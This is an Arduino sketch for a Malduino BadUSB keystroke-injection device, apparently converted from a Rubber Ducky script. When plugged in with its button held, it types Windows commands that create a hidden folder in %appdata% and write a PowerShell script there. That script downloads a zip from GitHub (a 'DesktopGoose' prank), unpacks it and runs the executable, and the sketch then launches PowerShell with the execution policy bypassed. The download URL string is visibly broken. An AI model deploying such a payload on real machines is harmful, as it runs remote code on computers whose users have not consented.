/*
Copyright (c) 2017 Seytonic, Spacehuhn (Licensed under MIT)
For more information see: github.com/seytonic/malduino
*/

#include "Keyboard.h"
#include "Mouse.h"

#define blinkInterval 50
#define ledPin 3
#define buttonPin 6

int defaultDelay = 4;
int defaultCharDelay = 5;
int rMin = 0;
int rMax = 100;

bool ledOn = true;

void typeKey(int key){
  Keyboard.press(key);
  delay(defaultCharDelay);
  Keyboard.release(key);
}

void setup(){
  
  pinMode(buttonPin, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
  
  if(digitalRead(buttonPin) == LOW){
    
    Keyboard.begin();
    Mouse.begin();
    
    /* ----- Begin-Script -----*/
    
    /* [Parsed By Duckuino (Licensed under MIT) - for more information visit: https://github.com/Nurrl/Dckuino.js] */    
    delay(1000);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(114);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(300);

    delay(defaultDelay);
    Keyboard.print("cmd");

    delay(defaultDelay);
    delay(200);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    Keyboard.print("rmdir /Q /S %appdata%\\ducky");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    Keyboard.print("mkdir %appdata%\\ducky");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    Keyboard.print("cd %appdata%\\ducky");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    Keyboard.print("copy con ducky.ps1");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    Keyboard.print("Invoke-WebRequest -OutFile ducky.zip https://github.com/danperks/Malduino-Scripts/raw/master/1%20-%20AnnoyingGoose/DesktopGoose.zipcmd
    ");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    Keyboard.print("Expand-Archive ducky.zip ducky");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    Keyboard.print(".\\ducky\\DesktopGoose\\GooseDesktop.exe");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(99);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(300);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    Keyboard.print("exit");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(114);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(300);

    delay(defaultDelay);
    Keyboard.print("powershell -executionpolicy bypass");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(300);

    delay(defaultDelay);
    Keyboard.print("powershell.exe -file $env:APPDATA\\ducky\\ducky.ps1");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(100);
    
    /* ----- End-Script -----*/
    
    Keyboard.end();
  }
}

void loop(){
  ledOn = !ledOn;
  digitalWrite(ledPin, ledOn);
  delay(blinkInterval);
}
